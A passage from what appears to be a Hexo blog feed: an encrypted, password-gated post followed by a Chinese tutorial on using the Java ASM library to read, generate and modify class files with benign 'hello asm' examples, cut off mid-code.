6b59ae6689cde62c64cc264b0466784113723dee3d09e24f41f894e6699b22d86ac384d58ffba0d1a19e30541e63cee34643acc4bdf45ace70cc74539d369493ca1ddeebde7735514ea9b4af38ce2db4d8f9100c20cb8265f4038b84babed1c26ee9ba132b9372f4da5c9eb11a3fc0a604c3beb08c8574e5042521da19daea86c5bdea8e7086bbaa39e4bfd760fde243a22989c0cb753709d82e5afc57188d254236ec031392b1db8987ee3cf819b4894d56dbbfb17c6922320b6417a191fbdc49eeb4d73275512e477f2224f623b9ddd541da7a828c6c6685889752e9380ef3cc55fe4b95730cb91055da02f18f861424e6591dac9399a814bb99602c5cb143b1292d6c43ede6e56c540dd75d9802868aad764d649c0eb6ce6c4b95c8404c1e885461af2d16d96bdf82a021c6b11f7748b70df0c29abc3155c3414ab6c430943f83a8079464fb6ffe4aa60429052789a7cf7c2b83c19f001ba3d3ff2d001d1d7d423e80bb2ee05efab7dcf18e503f0be418f830263938364764fe23e79e53d6962d13aea734b8714dccb4051c3d123fbd78301b8f19855058b5144ac1bedac0f16138226eab327a1a89f94ccb01904acac3d1028eb6b473695f8219629d0c0aeda8b6ba760b452fad9117af19c92983dbf45bd23b637a92be8bac70f364f4455fcbb99c573c213668e742b849174b5a7066e9e53e0ca5eaa136475251f803509a5db5d8db359a88e33376b3f5bd0616b24ebbc5b0c0e2c94226cec008a8282c1b45df1a2b0982204196f89ff96a5e36f87e95307e3aa7203f163c244f5acaa05f976e9706398c3f19edb781ee42e1e4d329e62dae40fe4bba9f5c440c66a226b6af9193a99a06082aec92d04c8b3f9547a2f7c5cd609f52943af329773a9a6c2472ffc3354ca3c3e4976232d1df922e5daccdcc0c02fbc160ecad77d434c2ef74b476d0a4d0a16d90d9015a9478df08120b51ea4abf2b282fc13323e5968a7941b4817bf051a1526e4265fe4f7330e2a7325585064ddf51e9a59035e80d5ef1169338335439babb0d5008e8cb800c214d12b77b9e5b999e2697255228cce5c5c2f8abb00bced4bf97b38652872996e3bb0d2f9333e78d2002c662440e7ad66490eb99fe37e76aad84760aa026f7a0ec38bf171783141f105a3e94932325d63bb4f2d9f4d03d60f4f96c1248a4709611a5af969e80921ab42d31c5994d99bd426e7d5554177798dae12d2d8ebd9ad722df033b245d3e7e5e0c0ea5c8f1ef84e77fbe08bb893a8cf02e6515b0459eb95fd78f2265e592d851528127daf521f136721d0b439394107dd39699a8406558ce37e6b5f0bb95b832129a1c0f9ec29c336a8164b59e14a3bff19f6abe1f36c639f9761996d33c751bde30a430cbf011f5cc51f63a649adaa3487b28e59d7ea92f08fbddd84edcef5495a7f1d32c9078b77a43c2bde60707407f8e346afaa07b62759259c1a09c23eeae2bb289c80c042c6a5e8e6d76e35d5b4d8e2079435d852b345a2898e19588750e13f52448bd8a174a556d8add3f42092447a277490a450cf5b97be6cb2b488705ac69b8081a0cd826a38985b9ed3dcd42aa2890ed0e12db8f874e248d7a1789caf424502ef6aa83bed779182c20224e3bf31fa6f261c49bf991c0e5eda573a9f95b9f8a9bd85305ee064bd42104a58d7ef8f6287d9d77e23a47c76c0ab158eb918d9b38a526ef7779b5b9d86303fcefb02e0bc1a6f2b09ddda0b7993e15199e61946049310f5ed639f08208b214a6e5be8382bca0071ecdcc03ff339eb119b4fd18f4885a9a3f149933ab8324a5421422f100e1ac0bc987ba4db2b1746c8e7950384a38158a9fb127819f3218f82a732abef8a1b2af19a2d605ab7691b1c1ff4e866dfac89d368a73c0b8aa5c8c716d592c2211edb4957a28a88108b648a7cafc042cb61ca317470cb4c40a1b41c15ec166af6efc9594316d617c2b6ac1bc358810921813785f496e3f74dae44088423cf561be2784ae8afc2c896dd6915b94109db1e6960f3eff519a849f0809c82f3f08f3698571445d9d1b074b94b8882804c221a0f11ecde31a241aa3c36f64a58bdf48e3396d388551dda05b822ceef597f423722cda4325957607d9fb9f037007678d029bb54c819ab56f3d1b109f242de831577bc3a6eef8c8c56835edbfbb448c814a522bab45ef291dcb8499f5edca5eb533e249207e0ccf542f625c6783c41a56ce7f705910a8a52ecb3362770fa429786cd1b81d6be7f5870641c6a1ae802f134a7ff7418514a979d5fdb42fe7588e547261abc779a7c82b3f83cc86cd6d27da0607399bbe84d94bc9522c3523279edbfc3af4f3d4d9fd8d832096ad1c3ade35c018176c436ee668ad14ed2acfabdabbff91530113469b0b302a624ab90c2a60999015bd6822ac272872024b16ac90f7ab66612b597ec5f87a72bc682e7ac33ac447f9ff72abe37fe459661bbe0df3b1c7dbe1da2f299d2a8312833cdce5ed2b10659d3bc96328d3e96848e3f29a893bd581990ce32ab5baae4f81f6e4df0cc0bb6cf1a7db80d54694401d65b5f2af08c28655cb040d48f25e52bd1e70d41c3d68dd5a577a7a1fdf3a3f163c760cadd4296042875cdae147133213fdaaa66c75d3d2e1dfd98416b310139fb64cb87d406d8034b29ce3664c965a018f797f53fe64214c57983e1915d4c9b5f50fa3d1a3edb1a45cd0e6be6579a1cf3b9bd6e0e0ba0ca1eea1659c4c28644516c49f72207cac9a37a5489dc3557a64a2afbaa68acc6147deca8850d11427a7794e598ae2c6b64316829e3446d2ad3beaa40dc5dc87836b17d7256eaeab9e3fe13e51a80fdfd515e670086134e11ef44935c643ef1ffd786b24749bb71a1bc902f1455c8489d42f03ee03b72eefef3ba4b3c6e42177d0b6629ec85099bfbac65ba0bcbda4e7a0b3e75e432a139748676a625ab34f213a15128fb9b88f1628f11eaaf78061fa87bf0f9b8099640dec978fb52c18456fcd0f024f97b1b4cdf66d27fcaf7ca7accb55630d1fdf34ead8d0509ec5c9432532839db1bc9a82e706078ae386e5d5be2a8c3926e29b9b77e600eb4d9eac722e057c99e1b4ee62baba9f8ad54eb629366679b2218ff70bcba786a1b347c115bc31e5cfae639b581453c622a04b67a441b81895a3f7b2fc1061d421cab74fd7a00217dfda97d34853b02fd1e05a11529857deed06f759548af30b35c1ca1037d1228c6644e03fdd0a91b7058bb760f34588b35b6926a6de1bac2386709808047cac8021c2fb1a3a6b2b8f352de493e7cbc54134d6fddb84fffc4f1d93de695d142104745f4e32866712cacfb8164c55df586d5df339e7cd8a834e8d44adae660b8458e933c169b9bdd502b38d52bb0268eac8f012e502d80a10fce6f29ddf5e279564b1684c6697d48619178515fe951010266a74f2db8c2c9486f6a7d4381254e10828009f97ec62a6908597a511eaa8f690152c5d3ed76b172c5e017a68b6ae1d438703b8b34fbc67fa2d1878630f59f3473daab494cd023dbdda7a4e997e562b160e7744b4bf60ad3d47469f2e78d36ce1bbad7c0780994aef5c936fb7a6d10ad26e5b86bacd87c7d85ce39a33fd19dd3b26debf9b816811676f260b7b9674293295569c6330e617aa0f8d57ae6088d04f35354a2e4f9a252144f0e409e75e064f347ab687414e03c825d9aef5c8070760b909a3b2847400818da064474a89383d8abe17f2a07d36e2ccf37ec602a5b7257d4353cd3a051461f42946ca1386ee8beb38d443b10b219a5538502a95a020adbf05e3e2548156852a6cbc62dff032dde345635c3494ff9dd6c2df214ba01d5fbe5d9f28fb6e3b4d74ffbf5d95a6db52e5b91e58fa1e27be665e75258abf17fb68db6534472932f63348ad8c08c08f59cf8ff78dca42d794008ddca29f50be65e270248edf1f033ad1cfe0ccf3ab23b56c9dc8ae272a6d91c56d30bea29add6c4ee8ad4ffdcf695fc7ca9f769eb56573b53a19eb7c3f9e38793a9a6fd5caafe6fda5272f8607fbfa8929932339643464b688b4499fc38b37739bad24aae797cd610ce63fe787c8fc53e0160c470a717ad981dc6c0fb055d857415fb4a9f915294c0622b43858c85f9946aaa0af596e465727ee108a5f9dc03691f751dedb1703ab84c094b5cd93da132ce7f54a19c22b37cde6b0e78ae7b0dd95230cd3f4e9f334afaf985dbd9e94c2dc98ad47d198fee3166f1a5e85a860d680b960af750f73fd0f8c94247846babcbfb015a4977be8f5a16ccea7783f97116725e392c9ba55d617e6eab17d0320c7289219315ecf210ab82f5c8f13d10083be8247a6ee3834c2f1a370a9485e3544e4e896bee597e2fc59877afb13bb9362275047d3f45b20eedaaaf7ac008f4ea70d0e5fca2164476a4e5251f66c72af08ab89776ff4c35125abc45065702e1efeffe4f3a7a39a08682760a3898ca73e22d7b3eb5315d091e54a1ee6cab52cad15c659e953d582837a6f5c0bd4a84b937380e0fbea9bc16b4f43814ed3498936dd29b620c52443cbe9d1064d3a5ea0994f11c6a590fd718318ce31c84dade2a38f9b6d20b58464c1e541b17a64eaa07d01f67aee561c3c1262d010f1e81cb4130365bb3652917ca570c82fbd4c8f5560c722519c2327f4d3f5f3ba83c9b92e2d1041b303fd266fa21371ee6cc71498e6b14783ffadeb7b6e30326a2df858e13c5f4b32bb9c112b39693158d67fa04a5b106ac7728dee0b9b60d465743932fa6589bd9eb5ac2df28ebe414d3540e8918dd887c6bde2f8276bca28b270a8262e874633fb1ad92c6252e2734f9fee47c338c6ea80cdd66124a97235058d43fa16e328b446f21ccfd5781cf93f17ad38af7983246bd8ae57155014ebf742f2a60c3f551b41c5ee4e40b5f</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">听说只有管理员才可以查看哦</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">fist-page肯定是测试用的啦，第一次都是他的，需要测试的都给他第一时间内安排。</summary>
    
    
    
    
    <category term="Test" scheme="http://example.com/tags/Test/"/>
    
  </entry>
  
  <entry>
    <title>asm</title>
    <link href="http://example.com/2022/11/19/asm/"/>
    <id>http://example.com/2022/11/19/asm/</id>
    <published>2022-11-19T12:08:37.664Z</published>
    <updated>2022-11-23T08:40:31.107Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="asm"><a href="#asm" class="headerlink" title="asm"></a>asm</h1><h2 id="分析类"><a href="#分析类" class="headerlink" title="分析类"></a>分析类</h2><p>分析类的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="variable">aBoolean</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">render</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello asm&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MyClassVisitors类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassVisitor;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.FieldVisitor;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassVisitors</span> <span class="keyword">extends</span> <span class="title class_">ClassVisitor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClassVisitors</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(ASM5);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 继承关系</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> version</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> access</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> signature</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> superName</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> interfaces</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visit</span><span class="params">(<span class="type">int</span> version,<span class="type">int</span> access,String name,String signature,String superName,String[] interfaces)</span>&#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;extends &quot;</span> + superName + <span class="string">&quot;&#123;&quot;</span>);</span><br><span class="line">        <span class="built_in">super</span>.visit(version,access,name,signature,superName,interfaces);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 属性变量</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> access</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> desc</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> signature</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> FieldVisitor <span class="title function_">visitField</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, Object value)</span> &#123;</span><br><span class="line">        System.out.println(desc + <span class="string">&quot; &quot;</span> + name);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.visitField(access, name, desc, signature, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 方法</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> access</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> desc</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> signature</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> exceptions</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, String[] exceptions)</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot; &quot;</span> + desc);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitEnd</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        <span class="built_in">super</span>.visitEnd();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassReader;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 通过asm框架分析类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AnalysisClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">MyClassVisitors</span> <span class="variable">myClassVisitors</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassVisitors</span>();</span><br><span class="line">        <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(Test.class.getName());</span><br><span class="line">        classReader.accept(myClassVisitors,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/63966847/150936112-ab83838c-4f67-4102-9816-ce2afa734559.png" alt="image-20220125122358358"></p><p><img src="https://user-images.githubusercontent.com/63966847/150936121-914e2c3a-6019-4f01-91ed-38c5453cab39.png" alt="image-20220125122420194"></p><blockquote><p>该部分也是GI的核心。<a href="https://xz.aliyun.com/t/10363">https://xz.aliyun.com/t/10363</a></p></blockquote><h2 id="生成类"><a href="#生成类" class="headerlink" title="生成类"></a>生成类</h2><blockquote><p>感觉用于webshell中。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WriteClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassWriter</span> <span class="variable">classWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(ClassWriter.COMPUTE_MAXS);</span><br><span class="line">        <span class="comment">// java1.8 public修饰 路径 签名 父类 接口</span></span><br><span class="line">        classWriter.visit(V1_8, ACC_PUBLIC, <span class="string">&quot;com/firebasky/utils/asm/learn/Learn2Test&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;java/lang/Object&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//public和static修饰 方法名 描述符 签名 异常</span></span><br><span class="line">        <span class="type">MethodVisitor</span> <span class="variable">render</span> <span class="operator">=</span> classWriter.visitMethod(ACC_PUBLIC + ACC_STATIC, <span class="string">&quot;render&quot;</span>, <span class="string">&quot;()V&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//插入一个字段是方法里面插入 操作码 路径 名字 描述符</span></span><br><span class="line">        render.visitFieldInsn(GETSTATIC, <span class="string">&quot;java/lang/System&quot;</span>, <span class="string">&quot;out&quot;</span>, <span class="string">&quot;Ljava/io/PrintStream;&quot;</span>);</span><br><span class="line">        <span class="comment">//插入一个ldc</span></span><br><span class="line">        render.visitLdcInsn(<span class="string">&quot;Hello asm!&quot;</span>);</span><br><span class="line">        <span class="comment">//插入一个方法 操作码 路径 方法名 参数 是否为接口的方法</span></span><br><span class="line">        render.visitMethodInsn(INVOKEVIRTUAL, <span class="string">&quot;java/io/PrintStream&quot;</span>, <span class="string">&quot;println&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)V&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        <span class="comment">//插入返回值</span></span><br><span class="line">        render.visitInsn(RETURN);</span><br><span class="line">        <span class="comment">//设置栈和局部变量大小</span></span><br><span class="line">        render.visitMaxs(<span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//结束</span></span><br><span class="line">        render.visitEnd();</span><br><span class="line">        classWriter.visitEnd();</span><br><span class="line">        <span class="comment">//生成文件</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = classWriter.toByteArray();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;d://1.class&quot;</span>);</span><br><span class="line">        outputStream.write(bytes);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firebasky.utils.asm.learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Learn2Test</span> &#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">render</span><span class="params">()</span> &#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;Hello asm!&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="加载或移除类成员"><a href="#加载或移除类成员" class="headerlink" title="加载或移除类成员"></a>加载或移除类成员</h2><p>主程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassReader;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Learn3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(Test.class.getName());</span><br><span class="line">        <span class="type">ClassWriter</span> <span class="variable">classWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(ClassWriter.COMPUTE_MAXS);</span><br><span class="line">        <span class="type">MyClassVisitor</span> <span class="variable">myClassVisitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassVisitor</span>(classWriter);</span><br><span class="line">        classReader.accept(myClassVisitor,<span class="number">0</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = classWriter.toByteArray();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;d://1.class&quot;</span>);</span><br><span class="line">        outputStream.write(bytes);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MyClassVisitor类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassVisitor;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.FieldVisitor;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassVisitor</span> <span class="keyword">extends</span> <span class="title class_">ClassVisitor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClassVisitor</span><span class="params">(ClassWriter classWriter)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(ASM5, classWriter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> FieldVisitor <span class="title function_">visitField</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(name.equals(<span class="string">&quot;aBoolean&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.visitField(access, name, desc, signature, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature,String[] exceptions)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(name.equals(<span class="string">&quot;render&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitEnd</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.visitField(ACC_PRIVATE,<span class="string">&quot;name&quot;</span>,<span class="string">&quot;Ljava/lang/String;&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>).visitEnd();</span><br><span class="line">        <span class="built_in">super</span>.visitMethod(ACC_PRIVATE,<span class="string">&quot;name&quot;</span>,<span class="string">&quot;(Ljava/lang/String;)V&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>).visitEnd();</span><br><span class="line">        <span class="built_in">super</span>.visitEnd();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改之后的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span 